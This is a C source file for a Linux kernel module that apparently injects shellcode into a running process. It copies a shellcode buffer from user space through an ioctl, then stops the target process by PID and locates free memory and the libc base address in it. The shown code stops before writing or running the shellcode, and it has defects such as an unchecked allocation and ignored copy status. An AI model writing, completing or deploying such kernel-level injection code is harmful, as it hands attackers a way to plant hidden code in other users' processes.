#include "shellcode_injector.h"

#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/mman.h>
#include <linux/highmem.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/kallsyms.h>
#include <uapi/asm-generic/mman-common.h>

#include "consts.h"
#include "utils.h"

#define KERNEL_PRIV 1

int inject_shellcode_ioctl_parser(unsigned long arg, ShellcodeInjectionParameters* parameters) {
    unsigned long status;
    void* shellcode_usermode_address;
    status = copy_from_user((void*)parameters, (void*)arg, sizeof(ShellcodeInjectionParameters));
    shellcode_usermode_address = parameters->shellcode;
    parameters->shellcode = kmalloc(parameters->shellcode_size, GFP_KERNEL);
    status = copy_from_user(parameters->shellcode, shellcode_usermode_address, parameters->shellcode_size);
    if (SUCCESS != status) {
        return -EFAULT;
    }
    return SUCCESS;
}


int inject_shellcode(ShellcodeInjectionParameters* parameters) {
    int status;
    struct task_struct* target_task;
    struct pid* pid_struct;
    
    printk(KERN_INFO "Start injecting the shellcode to pid %d\n", parameters->pid);
    
    // find the target process
    pid_struct = find_get_pid(parameters->pid);
    target_task = pid_task(pid_struct, PIDTYPE_PID);
    if (NULL == target_task) {
        return INVALID_PID;
    }
    
    // stop the target process
    status = send_sig(SIGSTOP, target_task, KERNEL_PRIV);
    if (0 > status) {
        printk(KERN_INFO "Unable to stop the process, pid %d\n", parameters->pid);
        return SIGSTOP_FAILED;
    }
    printk(KERN_INFO "The process stopped successfully, pid %d\n", parameters->pid);

    void* free_addr = find_free_space_for_shellcode(parameters->pid);
    if (NULL == free_addr) {
        printk(KERN_INFO "Unable to find free space in the process, pid %d\n", parameters->pid);
        goto release_process;
    }
    printk(KERN_INFO "The free address is: %lx\n", free_addr);

    void* libc_addr = find_libc_address(parameters->pid);
    if (NULL == libc_addr) {
        printk(KERN_INFO "Unable to find libc in the process, pid %d\n", parameters->pid);
        goto release_process;
    }
    printk(KERN_INFO "The address of libc is: %lx\n", libc_addr);

release_process:
    send_sig(SIGCONT, target_task, KERNEL_PRIV);
    return status;
}